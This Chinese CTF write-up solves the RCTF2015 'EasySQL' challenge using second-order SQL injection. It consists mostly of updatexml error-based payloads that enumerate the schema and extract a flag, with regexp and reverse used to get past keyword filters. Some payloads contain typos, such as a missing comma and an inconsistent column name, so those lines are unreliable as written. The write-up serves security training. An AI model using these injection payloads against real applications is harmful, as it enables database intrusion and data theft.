---
title: '[RCTF2015]EasySQL'
date: 2024-06-08 17:11:09
tags:
     - 题解
     - sql注入
categories: 刷题笔记
---

### [RCTF2015]EasySQL)(二次注入&updatexml报错注入&正则匹配&逆转)

我们发现，这道题跟sql-libs的二次注入类似，我们首先在注册页面进行测试，发现在用户名中进行了过滤，过滤了substr，and，or等一些可以注入的字符，在这一栏进行了过滤，说明这里可能存在注入。

<!-- more -->

注册一个新的用户，用户名：123。密码：123。登陆用户，发现有一个修改密码的页面

![image-20240605203931676](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406052039718.png)

登录并进入修改密码的页面，修改密码

![image-20240605203943203](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406052039239.png)

说明存在二次注入

### 爆库

```
123"||(updatexml(1,concat('~'(select(database()))),1))#
```

![image-20240605200749144](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406052007294.png)

### 爆表

```
123"||(updatexml(1,concat('~',(select(group_concat(table_name))from(information_schema.tables)where(table_schema='web_sqli'))),1))#
```

![image-20240605202005072](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406052020120.png)

### 爆flag表

```
123"||(updatexml(1,concat('~',(select(group_concat(column_name))from(information_schema.columns)where(column_name='flag'))),1))#
```

![image-20240605202114249](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406052021293.png)

### 爆flag字段

```
123"||(updatexml(1,concat('~',(select(group_concat(flag))from(flag))),1))#
```

![image-20240605202206083](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406052022151.png)

很好，flag不在这，我们爆users表

### 爆users表

```
123"||(updatexml(1,concat('~',(select(group_concat(column_name))from(information_schema.columns)where(table_name='users'))),1))#
```

![image-20240605202446835](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406052024905.png)

### 爆real_flag_1s_her字段

```
123"||(updatexml(1,concat('~',(select(group_concat(real_flag_1s_her))from(users))),1))#
```

![image-20240605202904598](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406052029664.png)

该字段有多列，需要用**regexp(’^f’)\**将f开头的进行筛选（\**regexp()是sql的正则表达式**）

```
123"||(updatexml(1,(select(real_flag_1s_here)from(users)where(real_flag_1s_here)regexp('^f')),1))#
```

![image-20240605203249816](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406052032882.png)

得到一半的flag，由于substr，left，mid，right被禁了，我们使用reverse来反转flag

```
123"||(updatexml(1,(select(reverse(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('^f')),1))#
```

![image-20240605203409198](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406052034251.png)

得到另一半flag

我们进行组合，得到flag

```
flag{4707a8a0-ed51-44b3-b5c3-ace7edd82aec}
```
